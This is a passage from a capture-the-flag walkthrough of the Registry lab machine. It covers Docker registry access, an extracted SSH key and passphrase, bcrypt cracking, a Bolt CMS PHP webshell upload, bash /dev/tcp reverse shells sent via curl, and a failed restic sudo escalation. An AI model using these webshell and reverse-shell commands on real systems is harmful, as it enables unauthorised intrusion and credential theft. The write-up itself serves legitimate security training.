CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
# Private Docker Registry
- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/

```

I’ll save the certificate as `ca.crt`, add it to my local certificate store, and restart docker:

```

root@kali# cp ca.crt /usr/local/share/ca-certificates/
root@kali# update-ca-certificates
Updating certificates in /etc/ssl/certs...
1 added, 0 removed; done.
Running hooks in /etc/ca-certificates/update.d...

Adding debian:ca.pem
done.
Updating Mono key store
Mono Certificate Store Sync - version 6.4.0.198
Populate Mono certificate store from a concatenated list of certificates.
Copyright 2002, 2003 Motus Technologies. Copyright 2004-2008 Novell. BSD licensed.

Importing into legacy system store:
I already trust 130, your new list has 129
Certificate added: CN=Registry
1 new root certificates were added to your trust store.
Import process completed.

Importing into BTLS system store:
I already trust 130, your new list has 129
Certificate added: CN=Registry
1 new root certificates were added to your trust store.
Import process completed.
Done
done.
root@kali# service docker restart 

```

Now when I try to pull the image, I get a different error:

```

root@kali# docker pull docker.registry.htb/bolt-image
Using default tag: latest
Pulling repository docker.registry.htb/bolt-image
Error: image bolt-image:latest not found

```

Some googling reveals that this is because [I haven’t authenticated](https://github.com/docker/compose/issues/1622). I’ll use `docker login` to fix that:

```

root@kali# docker login -u admin -p admin docker.registry.htb
Login Succeeded

```

Now I can pull the image:

```

root@kali# docker pull docker.registry.htb/bolt-image
Using default tag: latest
latest: Pulling from bolt-image
f476d66f5408: Pull complete 
8882c27f669e: Pull complete 
d9af21273955: Pull complete 
f5029279ec12: Pull complete 
2931a8b44e49: Pull complete 
c71b0b975ab8: Pull complete 
02666a14e1b5: Pull complete 
3f12770883a6: Pull complete 
302bfcb3f10c: Pull complete 
Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b
Status: Downloaded newer image for docker.registry.htb/bolt-image:latest

```

#### Run

Now I can run the container, and I’ll use the following command to start the shell with a bash prompt in the container:

```

root@kali# docker run -it docker.registry.htb/bolt-image /bin/bash
root@38a04220f13a:/#

```

### Enumerate Container

Regardless of how I got access to the file system I can now enumerate the host. Looking through the file system, I already found a reference to SSH keys in `/root` and a password. I find the encrypted key in root’s homedir:

```

root@kali# ls fs/root/.ssh/
config  id_rsa  id_rsa.pub  known_hosts
root@kali# cat fs/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

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
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----

```

I also find `config`, which tells me where the key is useful:

```

root@kali# cat fs/root/.ssh/config 
Host registry
  User bolt
  Port 22
  Hostname registry.htb

```

I could also see the username bolt@registry.htb in the public key:

```

root@kali# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDQ0QB2PXyb2AUShspjygtkqjzXFuX0dbayPI/irOEYCAOtgQs+nb9Ij3vZZX+LMPpNtWJaGF+ti/5gTjnhfjyNji7L/3Se6aIJAqMlFqkf+E5xKntRlM9dpqMMNRLgAYAKW5lj5OciQ7ZaXx7btoYLiQHlxXbj8RwEirWuFqwbi2lznckAU9Ua1DSu6yKdqIIpkB2FvJVFakTS32FagJ+rGm9TIWeiOPaQvKhyXQ0jeBL4Sdi5PmhLtkdOEWVgYVSoWaOythA3J2c1UAhfl5dLGS0FuD4Dv46xyrI8H7gpAexa1yF3Kei4PTHBEIQxscejsfCEOVZwe4sngYKrU7o6sf0rWpOf7jHuEUMCZVQgQ55fvv10P6CA2qhPQ/bpKzp2pGXRb1Xdr6v+ObgQ4knkK1GKqOegOane0wyhD5RFQF/NeYBqt1UIM2KigDv9foENc7p9HhHGFoWJEzyOeWCm4QcSg9H2ZgfZRAhCoiEijHh19SdNh9wanydkaj9H7iTsvNDi8ON4sLRGjVBsfPLl+UjIIsHU+bG+pxHUzb65yHJ8iFX+DndJncdbQs6X9Ckii58ElBmkSUDSZpFsOV81vVk6qdGm+EBcpVO09YsC03nUj1VEHtQG8hOG/tJqesB50I5Gbi7+V2qZit3ZZOvkhVF5l2N0U9asjSpIT5Bmow== bolt@registry.htb

```

### SSH Access

Now I have all I need to connect in with SSH as bolt using the key and password “GkOcz221Ftb3ugog”:

```

root@kali# ssh -i ~/id_rsa_registry_root bolt@10.10.10.159
Enter passphrase for key '/root/id_rsa_registry_root': 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-29-generic x86_64)
Last login: Mon Oct 21 01:16:27 2019 from 10.10.14.6
bolt@bolt:~$ id
uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)

```

From there I can grab `user.txt` (which strangely isn’t an MD5 this time):

```

bolt@bolt:~$ cat user.txt
ytc0ytdm************************

```

## Priv: bolt –> www-data

### Get Bolt CMS Credentials

#### Enumeration

With a shell on the box, I can access the webserver setup, including the Bolt instance. In the config file located at `/var/www/html/bolt/app/config/config.yml`, I see this information about the database:

```

# If you're trying out Bolt, just keep it set to SQLite for now.
database:
    driver: sqlite
    databasename: bolt

```

One directory down, I find that database:

```

bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db 
bolt.db: SQLite 3.x database, last written using SQLite version 3022000

```

#### sqlite db

I’ll `scp` the database back to my box:

```

root@kali# scp -i ~/id_rsa_registry_bolt bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .
bolt.db                                                       100%  288KB   1.8MB/s   00:00 

```

Now I can check it out. First I’l show the tables:

```

root@kali# sqlite3 bolt.db 
SQLite version 3.29.0 2019-07-10 17:32:03
Enter ".help" for usage hints.
sqlite> .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy  

```

In looking through them, the most interesting is `bolt_users`:

```

sqlite> select * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-24 11:08:33|10.10.14.6|Admin|["files://cmd.php"]|1||||3||["root","everyone"]

```

That looks like username and hash for the admin login to manage the CMS.

#### Crack Hash

That hash looks to be bcrypt blowfish, according to the [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). That’s mode 3200. I’ll save the hash to a file and run `hashcat` against it. Because I don’t have a GPU cracking station, and I am working in my VM, this will be especially slow:

```

root@kali# hashcat -m 3200 admin.blowfish /usr/share/wordlists/rockyou.txt --force

```

Fortunately, after a couple minutes, there’s a hit:

```

$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry

```

#### Login

Now I can visit `https://10.10.10.159/bolt/bolt/` (which redirects to `https://10.10.10.159/bolt/bolt/login`), and log in with admin:strawberry. It takes me to the admin panel:

![1571962410670](https://0xdfimages.gitlab.io/img/1571962410670.png)

### Solid Webshell

#### Initial Webshell

In the menu in the picture above, I’ll select File Management –> Uploaded Files:

![1571962511184](https://0xdfimages.gitlab.io/img/1571962511184.png)

I’ll try to upload my standard simple PHP webshell:

```

<?php system($_REQUEST['cmd']); ?>

```

It returns the following error message:

![1571962572915](https://0xdfimages.gitlab.io/img/1571962572915.png)

But, I’m logged in as admin, and Bolt let’s me change that configuration. Under Configuration –> Main Configuration, it presents `config.yml`. If I scroll down, I can see the `accepted_file_types`:

![1571962674362](https://0xdfimages.gitlab.io/img/1571962674362.png)

I’ll add `php`, and save. Even though the comment says that certain file types (includine php) are never allowed even if they are in this list, I can now go back to the uploads page and upload `cmd.php`:

![1571962829345](https://0xdfimages.gitlab.io/img/1571962829345.png)

I can find it at `/bolt/files/cmd.php`

```

root@kali# curl -k -s https://10.10.10.159/bolt/files/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### Reverse Shell Fail

Right away I tried to get a reverse shell, and but it didn’t connect back to me. I tried several of the ones from the [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but none worked. I then tried just to connect back to myself using `nc` from my shell with `nc 10.10.14.6 443`, and it didn’t connect. There’s something blocking outbound.

If I wait a minute or two, I’ll notice that all that work gets undone. Specifically, the webshell is removed, and php is removed from the acceptable file types in the settings.

#### Better Webshell

Given that I needed to do some playing, having to reset my webshell every two minutes was getting annoying. I could script up the webshell delivery, but I opted for something else here. I uploaded a webshell, and visited `http://10.10.10.159/bolt/files/cmd.php?cmd=cp /var/www/html/bolt/files/cmd.php /var/www/html/.df.php`. This will copy the webshell into the root directory, creating a copy of the webshell that the automated scripts aren’t cleaning up at `https://10.10.10.159/.df.php?cmd=id`.

### Shell

#### Goals / Constrains

I want to go from this RCE via webshell to a full shell. Unfortunately, I can’t make connections back to my host. I’ll show two ways to get a shell.

#### Method 1: Catch Shell on Registry

I can use my SSH session as bolt to start a `nc` listener, and have the webshell camme back to localhost:

```

root@kali# curl -k 'https://10.10.10.159/.df.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'"

```

On doing so, I get a shell:

```

bolt@bolt:/dev/shm$ nc -lnvp 443
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 127.0.0.1 36010 received!
bash: cannot set terminal process group (971): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I can upgrade the shell just as I do locally with `python -c 'import pty;pty.spawn("bash")'`, and then Ctrl-Z, `stty raw -echo`, `fg`.

#### Method 2: SSH Reverse Tunnel

I can disconnect my SSH session and then reconnect with `-R:4444:localhost:443`. That will tell the remote host (Registry) to listen on 4444. Anything that is sent to 4444 will forward through the tunnel, and then be passed by my machine to localhost 443. So I’ll listen on 443 with `nc`, and then issue the exact same `curl` command as above:

```

root@kali# curl -k 'https://10.10.10.159/.df.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'"

```

At my listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from ::1.
Ncat: Connection from ::1:60530.
bash: cannot set terminal process group (971): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Priv: www-data –> root

### Enumeration

One of the first things I always check is `sudo`. But I didn’t even have to check that he because I remembered seeing `backup.php` when I was enumerating the websever. When I got a shell as bolt, I went to check it:

```

bolt@bolt:/var/www/html$ cat backup.php 
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");

```

This implies that the www-data user can run `restic` as root. `sudo -l` as www-data confirms:

```

www-data@bolt:~/html$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*

```

### Restic Background

I’d never heard of [Restic](https://restic.net/), but it looks like a backup solution. The `restic` binary has a bunch of subcommands:

```

www-data@bolt:~/html$ restic 

restic is a backup program which allows saving multiple revisions of files and
directories in an encrypted repository stored on different backends.

Usage:
  restic [command]

Available Commands:
  backup        Create a new backup of files and/or directories
  cat           Print internal objects to stdout
  check         Check the repository for errors
  diff          Show differences between two snapshots
  dump          Print a backed-up file to stdout
  find          Find a file or directory
  forget        Remove snapshots from the repository
  generate      Generate manual pages and auto-completion files (bash, zsh)
  help          Help about any command
  init          Initialize a new repository
  key           Manage keys (passwords)
  list          List objects in the repository
  ls            List files in a snapshot
  migrate       Apply migrations
  mount         Mount the repository
  prune         Remove unneeded data from the repository
  rebuild-index Build a new index file
  restore       Extract the data from a snapshot
  snapshots     List all snapshots
  tag           Modify tags on snapshots
  unlock        Remove locks other processes created
  version       Print version information

Flags:
      --cacert stringSlice       path to load root certificates from (default: use system certificates)
      --cache-dir string         set the cache directory
      --cleanup-cache            auto remove old cache directories
  -h, --help                     help for restic
      --json                     set output mode to JSON for commands that support it
      --limit-download int       limits downloads to a maximum rate in KiB/s. (default: unlimited)
      --limit-upload int         limits uploads to a maximum rate in KiB/s. (default: unlimited)
      --no-cache                 do not use a local cache
      --no-lock                  do not lock the repo, this allows some operations on read-only repos
  -o, --option key=value         set extended option (key=value, can be specified multiple times)
  -p, --password-file string     read the repository password from a file (default: $RESTIC_PASSWORD_FILE)
  -q, --quiet                    do not output comprehensive progress report
  -r, --repo string              repository to backup to or restore from (default: $RESTIC_REPOSITORY)
      --tls-client-cert string   path to a file containing PEM encoded TLS client certificate and private key

Use "restic [command] --help" for more information about a command.

```

There’s a few things to note here:
- `sudo` only allows the `backup` subcommand to be run as root.
- The `init` subcommand is used to create a new repository. On running it, I’ll need to provide the password for the repository, and there’s no way to read data from the repo without that password.
- `-r` defines the repository in use for the `restic` operation.
- The [docs for Preparing a new repo](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html) show that repos can be local, or accessed over SFTP, REST, Amazon S3, Minio, OpenStack Swift, and several other commercial cloud providers.

### Local Repo - Failed

My first thinking was to create a local repo, and then inspect the files in it and find the flag. Fortunately for `restic` users, and unfortunately for me, the software does a good job of preserving file permissions. I’ll show that failure, but you won’t miss anything about solving the box if you skip to the next section.

I’ll work out of the `/dev/shm` dir since I won’t get to define a full path on the repo. Then I’ll `init` a local repo:

```

www-data@bolt:/dev/shm$ restic init -r rest0xdf
enter password for new repository: 
enter password again: 
created restic repository 5229c88567 at rest0xdf

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.

```

My repo has been created:

```

www-data@bolt:/dev/shm$ ls -l
total 0
drwx------ 7 www-data www-data 160 Oct 25 10:46 rest0xdf
www-data@bolt:/dev/shm$ ls -l rest0xdf/
total 4
-rw-------   1 www-data www-data  155 Oct 25 10:46 config
drwx------ 258 www-data www-data 5160 Oct 25 10:46 data
drwx------   2 www-data www-data   40 Oct 25 10:46 index
drwx------   2 www-data www-data   60 Oct 25 10:46 keys
drwx------   2 www-data www-data   40 Oct 25 10:46 locks
drwx------   2 www-data www-data   40 Oct 25 10:46 snapshots

```

Now I’ll backup a file I can read:

```

www-data@bolt:/dev/shm$ restic backup -r rest0xdf /var/www/html/index.html 
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
scan [/var/www/html/index.html]
scanned 0 directories, 1 files in 0:00
[0:00] 100.00%  612B / 612B  1 / 1 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 03d3afde saved

```

After reading a bunch of docs and the help files, I figured out how to list files and read files from the backup using `restic`. I can list the files and see `index.html` is in there:

```

www-data@bolt:/dev/shm$ restic -r rest0xdf ls latest
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
snapshot 03d3afde of [/var/www/html/index.html] at 2019-10-25 10:47:18.600770953 +0000 UTC):
/index.html

```

I can `dump` the file as well:

```

www-data@bolt:/dev/shm$ restic -r rest0xdf dump latest index.html
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

```

I also looked to see if the file existed on the file system in plaintext, but it did not:

```

www-data@bolt:/dev/shm$ grep -r "Welcome to nginx" .
www-data@bolt:/dev/shm$

```

That makes sense since the contents are encrypted with the key I set at `init`. I can see that there are a couple files in `data` now, owned by www-data, the user that invoked the backup command:

```

www-data@bolt:/dev/shm$ find . -type f -ls
      267      4 -rw-------   1 www-data www-data      155 Oct 25 10:46 ./rest0xdf/config
      269      4 -rw-------   1 www-data www-data      717 Oct 25 10:47 ./rest0xdf/data/46/46a169efef7435ab7f89b27fcebd0cff460c3f67fd463fee1cf442c87af745d5
      270      4 -rw-------   1 www-data www-data      475 Oct 25 10:47 ./rest0xdf/data/0b/0b6a29d81d6dae16e2319be1d6b85f34507de52ab93c85aba0b3021eba102a15
      266      4 -rw-------   1 www-data www-data      446 Oct 25 10:46 ./rest0xdf/keys/474c5acc54f6f0a1546057a4bfb9198de12f81fdc49b798fc7f8671cb7c4f3d3
      271      4 -rw-------   1 www-data www-data      436 Oct 25 10:47 ./rest0xdf/index/49b380245c42e2c279c48661309bce4747ca27d04ba26c05dd6546f44f41737f
      272      4 -rw-------   1 www-data www-data      242 Oct 25 10:47 ./rest0xdf/snapshots/03d3afde453db4a6bfb7f609b7e193f74da4df26aa3ed75f780ee71e41d3149a

```

I’ll now try to add `root.txt`. I’ll copy the exact structure of the command from the `sudo -l` output, and running it seems to work:

```

www-data@bolt:/dev/shm$ sudo /usr/bin/restic backup -r rest0xdf /root/root.txt
enter password for repository: 
password is correct
found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root/root.txt]
scanned 0 directories, 1 files in 0:00
[0:00] 100.00%  33B / 33B  1 / 1 items  0 errors  ETA 0:00 
duration: 0:00
snapshot c1b113d3 saved

```

When I try to run `restic ls`, it returns a bunch of permission denied errors:

```

www-data@bolt:/dev/shm$ restic -r rest0xdf ls latest             
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 300.924934ms: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 981.114221ms: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 1.210207268s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 2.124743713s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 3.401829302s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 2.327157547s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 7.53879474s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 6.302533801s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 11.599751446s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
Load(<index/c802404d7b>, 0, 0) returned error, retrying after 18.2850434s: open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied
open rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836: permission denied, ignoring
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 500.909542ms: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 504.502572ms: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 1.226562911s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 2.181554963s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 1.533140373s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 5.667654255s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 6.8113573s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 7.396488766s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 9.413027788s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Load(<snapshot/c1b113d35f>, 0, 0) returned error, retrying after 28.261058733s: open rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e: permission denied
Ignoring "latest", no snapshot matched given filter (Paths:[] Tags:[] Host:)

```

I can see there are files now in the repo structure owned by root:

```

www-data@bolt:/dev/shm$ find . -type f -ls           
      267      4 -rw-------   1 www-data www-data      155 Oct 25 10:46 ./rest0xdf/config
      268      4 -rw-------   1 root     root          138 Oct 25 10:53 ./rest0xdf/data/d3/d34aaa5ed0cf530ee647a0ecf72e684765df00bccbb5bfe2554682b491ac3353
      273      4 -rw-------   1 root     root          463 Oct 25 10:53 ./rest0xdf/data/65/65bb60bf25f74a8894e66ce316b4d18a9c41835709b5c2cf3988c227f692eae9
      269      4 -rw-------   1 www-data www-data      717 Oct 25 10:47 ./rest0xdf/data/46/46a169efef7435ab7f89b27fcebd0cff460c3f67fd463fee1cf442c87af745d5
      270      4 -rw-------   1 www-data www-data      475 Oct 25 10:47 ./rest0xdf/data/0b/0b6a29d81d6dae16e2319be1d6b85f34507de52ab93c85aba0b3021eba102a15
      266      4 -rw-------   1 www-data www-data      446 Oct 25 10:46 ./rest0xdf/keys/474c5acc54f6f0a1546057a4bfb9198de12f81fdc49b798fc7f8671cb7c4f3d3
      274      4 -rw-------   1 root     root          435 Oct 25 10:53 ./rest0xdf/index/c802404d7b937a74fc9da785c65ccec80ecf7e37d9c0e69415177deb1dae3836
      271      4 -rw-------   1 www-data www-data      436 Oct 25 10:47 ./rest0xdf/index/49b380245c42e2c279c48661309bce4747ca27d04ba26c05dd6546f44f41737f
      275      4 -rw-------   1 root     root          210 Oct 25 10:53 ./rest0xdf/snapshots/c1b113d35fc5413049b285ab526bfbc44db32ad5e62c81e19452ca2d0d99620e
      272      4 -rw-------   1 www-data www-data      242 Oct 25 10:47 ./rest0xdf/snapshots/03d3afde453db4a6bfb7f609b7e193f74da4df26aa3ed75f780ee71e41d3149a

```

### REST Repo

